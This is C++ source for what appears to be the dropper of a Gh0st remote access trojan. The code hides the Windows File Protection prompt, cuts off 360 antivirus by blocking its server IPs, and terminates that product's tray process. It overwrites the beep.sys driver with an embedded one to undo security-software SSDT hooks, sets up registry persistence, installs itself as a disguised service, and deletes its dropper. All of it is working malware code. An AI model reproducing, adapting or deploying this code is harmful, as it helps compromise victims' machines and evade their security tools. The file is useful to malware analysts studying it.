// New_Gh0st.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MyCommon.h"
#include "RESSDTR3/RESSDT.h"
#include "LoadExe.h"
#include "ANSI_UNICODE.h"

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString)
{
	HRSRC hResInfo;
	HGLOBAL hRes;
	HANDLE hFile;
	DWORD dwBytes;

	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL) return FALSE;
	hFile = CreateFile
		(
		lpFileName, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL) return FALSE;
	
	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	// 写入配置
	if (lpConfigString != NULL)
	{
		WriteFile(hFile, lpConfigString, lstrlen(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	FreeResource(hRes);

	return TRUE;
}

DWORD WINAPI MSG_AntiRising(LPVOID lparam)
{
	return MessageBox( NULL, "请您使用正版windows", "Microsoft", NULL );
}

DWORD WINAPI Close_WFP(LPVOID lparam)
{
	HWND hWFP;
	while(1)
	{
		hWFP = FindWindow( NULL, "Windows 文件保护" );
		if (hWFP)
		{
			ShowWindow( hWFP,SW_HIDE );
		}
		Sleep(500);
	}
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	ExitProcess(0);
}
void EndOfPro(UINT result)
{
	ExitProcess(result);
}
DWORD WINAPI MyCreateWindow(LPVOID lparam)
{
	MyCommon::MyCreateWindow("myyyy");
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失
	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);
	//////////////////////////////////////////////////////////////////////////
	CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)MyCreateWindow, NULL, 0, NULL );
	CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Close_WFP, NULL, 0, NULL );
	Sleep(500);
	BOOL bDelete = FALSE;
	char FilePath[MAX_PATH];
	DWORD Pid_Rs = MyCommon::GetProcessID("RavMonD.exe");
	DWORD Pid_360 = MyCommon::GetProcessID("360Tray.exe");
	GetModuleFileName( hInstance, FilePath, sizeof(FilePath) );
	char *pos = strrchr( FilePath, '\\' );
	pos++;
	if ( Pid_360 != 0 )
	{
		if (MyCommon::GetAddr())
		{
			MyCommon::Stop360("125.39.100.73");
			MyCommon::Stop360("221.194.134.38");
			MyCommon::Stop360("125.46.1.227");
			MyCommon::Stop360("125.211.198.240");
			MyCommon::Stop360("125.211.198.237");
			char ips[30];
			int iii = 0;
			for ( iii = 0; iii <= 255; iii++ )
			{
				wsprintf( ips, "124.238.254.%d", iii );
				MyCommon::Stop360(ips);
			}
		}
	}
	STARTUPINFO si;
	GetStartupInfo(&si);
	if ( OpenProcess( PROCESS_ALL_ACCESS, FALSE, MyCommon::GetProcessID("csrss.exe") ) != NULL )
	{
		ExitProcess(0);
	}
	if ( lstrcmpi( pos, "services.exe" ) != 0 )// && Pid_Rs != 0 )
	{
		HKEY hKey = NULL;
		RegOpenKeyEx( HKEY_CURRENT_USER, "Console", 0, KEY_READ|KEY_WRITE, &hKey );
		RegSetValueEx( hKey, "FuckYou", 0, REG_SZ, (LPBYTE)FilePath, lstrlen(FilePath) + 1 );
		RegCloseKey(hKey);
		if ( Pid_Rs != 0 )
		{
			CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)MSG_AntiRising, NULL, 0, NULL );
		}
		LoadExe(FilePath);
		ExitProcess(0);
	}
//	if ( Pid_Rs != 0 )

	ReSSDTR3();
	if ( !MyCommon::DevRunning() )
	{
		//下面是替换服务恢复SSDT
		char SysPath[MAX_PATH];
		char ChePath[MAX_PATH];
		GetSystemDirectory( SysPath, sizeof(SysPath) );
		lstrcpy( ChePath, SysPath );
		lstrcat( SysPath, "\\drivers\\beep.sys" );
		lstrcat( ChePath, "\\dllcache\\beep.sys" );
		MyCommon::StopService("Beep");
		Sleep(1000);
		SetFileAttributes( SysPath, FILE_ATTRIBUTE_NORMAL );
		SetFileAttributes( ChePath, FILE_ATTRIBUTE_NORMAL );
		ReleaseResource( NULL, IDR_SYS, "HIPS", ChePath, NULL );
		ReleaseResource( NULL, IDR_SYS, "HIPS", SysPath, NULL );
		MyCommon::StartService("Beep");
	}

	for ( int i = 0; i <= 45; i++ )//牵扯到360的最大提示时间是40秒，所以就每秒判断了
	{
		Sleep(1000);
		if ( MyCommon::DevRunning() )
		{
			MyCommon::ReSSDTR0();
			break;
		}
	}

	MyCommon::DevKillPro(MyCommon::GetProcessID("360Tray.exe"));

	Sleep(5000);

//	char *pos = NULL;
	//开始该干什么就干什么了
	char *lpEncodeString = (char*)MyCommon::FindConfigString( IDR_ENCODE, "InFormation" );
	if (!lpEncodeString) EndOfPro(-2);
	HANDLE	hMutex = CreateMutex(NULL, true, lpEncodeString);
	DWORD	dwLastError = GetLastError();
	if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED) EndOfPro(-2);
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	lstrcpy( MyCommon::EncodeString, lpEncodeString );
	char *lpServiceConfig = (char*)MyCommon::FindConfigString( IDR_CONFIG, "InFormation" );
	if (!lpServiceConfig) EndOfPro(-1);
	pos = strstr( lpServiceConfig, "()" );
	if (pos)
	{
		*pos = '\0';
		bDelete = TRUE;
	}
	lstrcpy( MyCommon::ServiceConfig, lpServiceConfig );
	pos = strchr( MyCommon::ServiceConfig, '|' );
	if (!pos) EndOfPro(0);
	*pos = '\0';
	char *lpServiceDisplayName = MyCommon::MyDecode( (char*)MyCommon::ServiceConfig );
	if (!lpServiceDisplayName) EndOfPro(-1);
	char *lpServiceDescription = MyCommon::MyDecode(pos + 1);
	if (!lpServiceDescription) EndOfPro(-2);
	SetUnhandledExceptionFilter(bad_exception);
	char *InstallServiceName = (char*)MyCommon::InstallService( lpServiceDisplayName, lpServiceDescription, MyCommon::EncodeString );
	if (InstallServiceName)
	{
		MyCommon::StartService(InstallServiceName);
	}

	HKEY hKey = NULL;
	char Buffer[MAX_PATH];
	DWORD type, size = sizeof(Buffer);
	RegOpenKeyEx( HKEY_CURRENT_USER, "Console", 0, KEY_READ|KEY_WRITE, &hKey );
	RegQueryValueEx( hKey, "FuckYou", 0, &type, (LPBYTE)Buffer, &size );
	RegDeleteValue( hKey, "FuckYou" );
	RegCloseKey(hKey);
	if (bDelete) DeleteFile(Buffer);

	Sleep(10000);
	EndOfPro(0);
	return 0;
}
